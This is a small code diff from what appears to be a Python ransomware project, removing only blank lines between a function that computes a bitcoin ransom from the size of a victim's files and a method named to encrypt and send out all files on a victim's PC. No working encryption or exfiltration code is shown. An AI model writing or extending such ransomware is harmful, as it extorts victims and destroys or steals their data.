@@ -201,12 +201,6 @@ class Ransomware:
         global bitcoin_needed
         bitcoin_needed = str((size_of_files/10000000000) * 0.0002)
 
-
- 
-        
-    
-
-
     # Encrypt all the safe to encrypt files on a victims pc
     def encrypt_and_send_all_files(self, directory, key):
 
